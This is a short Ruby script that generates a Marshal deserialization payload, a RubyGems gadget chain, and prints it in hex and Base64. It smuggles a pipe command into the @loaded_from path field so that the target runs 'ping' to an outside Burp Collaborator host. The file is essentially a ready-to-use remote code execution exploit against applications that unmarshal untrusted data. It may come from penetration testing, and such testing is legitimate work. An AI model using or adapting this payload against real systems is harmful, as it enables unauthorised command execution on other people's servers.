#!/usr/bin/env ruby

class Gem::StubSpecification
  def initialize; end
end

cmd="|ping xqr0wzwkcldkqz8asl6u4xrc0360up.burpcollaborator.net"
stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, cmd)

class Gem::Source::SpecificFile
  def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

class Gem::Requirement
  def marshal_dump
    [$dependency_list]
  end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
